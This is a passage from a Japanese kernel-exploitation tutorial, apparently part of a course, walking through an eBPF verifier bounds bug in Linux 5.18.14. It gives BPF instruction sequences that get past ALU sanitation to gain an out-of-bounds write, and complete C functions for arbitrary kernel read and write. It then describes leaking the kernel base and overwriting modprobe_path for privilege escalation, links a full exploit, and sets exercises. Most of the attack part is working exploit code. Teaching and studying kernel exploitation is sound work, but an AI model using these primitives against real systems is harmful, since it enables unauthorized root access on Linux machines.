試しに検証器が1と判断し、実際の値が0x10であるようなレジスタを作ります。<code>write</code>で0x10バイト以上のデータを送り、それがマップにコピーされているかをgdbで確認します。（サイズとして0（と推測される値）を渡すと検証器に警告されるので注意）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="comment">// R1 --&gt; 0 / actual: 1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 1 / actual: 0x10</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// map[0]に書き込み（ALU sanitationの回避）</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),              <span class="comment">// arg2=offset (0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_9),      <span class="comment">// arg3=to (&amp;map[0])</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),      <span class="comment">// arg4=len (1/0x10)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),      <span class="comment">// arg1=skb</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>上のプログラムでは、BPFマップの0番目の要素（最初に取得したアドレスR9に保存している）に対して<code>skb_load_bytes</code>でパケットデータを書き込みます。実際には0x10バイト書き込まれますが、検証器は1バイトと推測しているため許可されます。<br>
プログラムを呼び出す際に、次のように0x10バイトのデータを送ってみましょう。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> payload[<span class="number">0x10</span>];</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">0</span>] = <span class="number">0x4141414141414141</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">8</span>] = <span class="number">0xdeadbeefcafebabe</span>;</span><br><span class="line">write(socks[<span class="number">1</span>], payload, <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure>
<p>実行後にgdbでマップのアドレスを確認すると、下図のように、今回のデータサイズである8バイトを超えて範囲外書き込みできていることが分かります。</p>
<center>
  <img src="img/oob_write.png" alt="ALU sanitationを回避した範囲外書き込み" style="width:600px;">
</center>
<p>ヒープ上での範囲外書き込みが実現できているため、後はみなさんの好きな方法でexploitできるでしょう。例えばBPFマップを2つ並べて、後ろのマップの<code>ops</code>を書き換えるなどの方法が考えられます。<br>
しかし、せっかくなので今回は、BPFの特徴を生かしてAAR/AAWを実現してみましょう。</p>
<h2 id="AAR-AAWの作成">AAR/AAWの作成</h2>
<p>BPFのスタックにはポインタが書き込めることを思い出しましょう。スタックに保存したデータは型や範囲が追跡されています。<br>
したがって、<code>skb_load_bytes</code>を使ってスタック上で範囲外<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>書き込みをすれば、スタック上に保存されたポインタをパケットデータで上書きできます。上書きされた後も検証器はポインタとして認識しているため、偽のポインタを読み書きできます。</p>
<p>図で表すと、下のようになります。</p>
<center>
  <img src="img/alus_bypass.png" alt="ポインタの書き換えによるAAR/AAW" style="width:720px;">
</center>
<p>最後に書き換えられたFP-0x18にあるデータはポインタとしてマークされているため、<code>BPF_LDX_MEM</code>で取り出せばポインタとして扱えます。<br>
このように、BPFの特徴を活かせば簡単にAAR/AAWを作ることができるのです。</p>
<details>
<summary>AAR/AAWのPoC</summary>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 任意アドレス読み込み</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">aar64</span><span class="params">(<span class="type">int</span> mapfd, <span class="type">unsigned</span> <span class="type">long</span> addr)</span> &#123;</span><br><span class="line">  <span class="type">char</span> verifier_log[<span class="number">0x10000</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line">  val = <span class="number">1</span>;</span><br><span class="line">  map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* BPFプログラム */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">// R8 --&gt; context</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R0 --&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / actual:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1) / actual:1</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0 / actual: 1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FP-0x18に有効なポインタを設置 (*)</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 1 / actual: 0x10</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (*)で用意したスタック上のポインタを上書き（ALU sanitationの回避）</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),              <span class="comment">// arg2=offset (0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),     <span class="comment">// arg3=to (FP-0x20)</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x20</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),      <span class="comment">// arg4=len (1/0x10)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),      <span class="comment">// arg1=skb</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 書き換えられた(*)のポインタを取得</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 任意アドレス読み書きが可能</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, <span class="number">0</span>), <span class="comment">// 偽ポインタから読み込み</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// リークしたデータをユーザー空間で受け取る</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), <span class="comment">// key</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP), <span class="comment">// value</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),          <span class="comment">// flag</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem), <span class="comment">// map_update_elem</span></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ソケット用に設定 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> &#123;</span><br><span class="line">    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">    .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(insns[<span class="number">0</span>]),</span><br><span class="line">    .insns = (<span class="type">uint64_t</span>)insns,</span><br><span class="line">    .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL v2&quot;</span>,</span><br><span class="line">    .log_level = <span class="number">2</span>,</span><br><span class="line">    .log_size = <span class="keyword">sizeof</span>(verifier_log),</span><br><span class="line">    .log_buf = (<span class="type">uint64_t</span>)verifier_log</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* BPFプログラムをロード */</span></span><br><span class="line">  <span class="type">int</span> progfd = bpf(BPF_PROG_LOAD, &amp;prog_attr);</span><br><span class="line">  <span class="keyword">if</span> (progfd == <span class="number">-1</span>) fatal(<span class="string">&quot;bpf(BPF_PROG_LOAD)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ソケットを作成 */</span></span><br><span class="line">  <span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    fatal(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(<span class="type">int</span>)))</span><br><span class="line">    fatal(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ソケットを利用（BPFプログラムの発動） */</span></span><br><span class="line">  <span class="type">char</span> payload[<span class="number">0x10</span>];</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">0</span>] = <span class="number">0x4141414141414141</span>;</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">8</span>] = addr; <span class="comment">// リークするアドレス</span></span><br><span class="line">  write(socks[<span class="number">1</span>], payload, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  map_lookup(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 任意アドレス書き込み</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">aaw64</span><span class="params">(<span class="type">int</span> mapfd, <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> value)</span> &#123;</span><br><span class="line">  <span class="type">char</span> verifier_log[<span class="number">0x10000</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line">  val = <span class="number">1</span>;</span><br><span class="line">  map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* BPFプログラム */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">// R8 --&gt; context</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R0 --&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0) / actual:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1) / actual:1</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0 / actual: 1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FP-0x18に有効なポインタを設置 (*)</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 1 / actual: 0x10</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (*)で用意したスタック上のポインタを上書き（ALU sanitationの回避）</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),              <span class="comment">// arg2=offset (0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),     <span class="comment">// arg3=to (FP-0x20)</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x20</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),      <span class="comment">// arg4=len (1/0x10)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),      <span class="comment">// arg1=skb</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 書き換えられた(*)のポインタを取得</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 任意アドレス読み書きが可能</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_1, value &gt;&gt; <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, value &amp; <span class="number">0xffffffff</span>),</span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, <span class="number">0</span>), <span class="comment">// 偽ポインタへの書き込み</span></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ソケット用に設定 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> &#123;</span><br><span class="line">    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">    .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(insns[<span class="number">0</span>]),</span><br><span class="line">    .insns = (<span class="type">uint64_t</span>)insns,</span><br><span class="line">    .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL v2&quot;</span>,</span><br><span class="line">    .log_level = <span class="number">2</span>,</span><br><span class="line">    .log_size = <span class="keyword">sizeof</span>(verifier_log),</span><br><span class="line">    .log_buf = (<span class="type">uint64_t</span>)verifier_log</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* BPFプログラムをロード */</span></span><br><span class="line">  <span class="type">int</span> progfd = bpf(BPF_PROG_LOAD, &amp;prog_attr);</span><br><span class="line">  <span class="keyword">if</span> (progfd == <span class="number">-1</span>) fatal(<span class="string">&quot;bpf(BPF_PROG_LOAD)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ソケットを作成 */</span></span><br><span class="line">  <span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    fatal(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(<span class="type">int</span>)))</span><br><span class="line">    fatal(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ソケットを利用（BPFプログラムの発動） */</span></span><br><span class="line">  <span class="type">char</span> payload[<span class="number">0x10</span>];</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">0</span>] = <span class="number">0x4141414141414141</span>;</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">8</span>] = addr; <span class="comment">// 書き換えるアドレス</span></span><br><span class="line">  write(socks[<span class="number">1</span>], payload, <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</details>
<h2 id="kASLRの回避と権限昇格">kASLRの回避と権限昇格</h2>
<p>今、マップのアドレスを持っているため、<code>bpf_map</code>の<code>ops</code>などを指す偽のポインタを作ることで、カーネルのベースアドレスがリークできます。また、ベースアドレスが取れたらAAWで<code>modprobe_path</code>などを書き換えて権限昇格できます。<br>
各自でexploitを完成させましょう。exploitコードの例は<a href="exploit/brahman_exp.c">ここ</a>からダウンロードできます。</p>
<hr>
<div class="column" title="例題">
  今回のバグでは<code>min_value > max_value</code>という状況が作れたため、<code>adjust_ptr_min_max_vals</code>を悪用してBPFマップのアドレスをリークしました。<br>
  (1) BPFマップやBPFスタック、コンテキストのアドレスをリークせずにexploitを完成させてください。<br>
  (2) さらに、<code>skb_load_bytes</code>によるヒープオーバーフローを利用して（BPFスタックを使わずに）exploitを完成させてください。
</div>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>Linuxカーネルのバージョンは5.18.14です。 <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p>スタックの範囲内だが、値の範囲外 <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>

</div> 

<div style="margin-top: 1em">
    <div class="h-line-primary"></div>
    
        <div class="pagination">
            <div class="pagination-bk"><a href="verifier.html">前のページへ</a></div>
            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
            <div class="pagination-fd"></div>
        </div>
    
</div>

<script>
    window.onload = detectors();
</script>

  
</article>
        </div>
      </div>
      
      <div class="footer">
    <div class="flex-container">
        <div class="footer-text">
            
                © 2022 ptr-yudai 🐈
                <br>
            
            
                
        </div>
    </div>
</div>

    </div>

  </body>
</html>
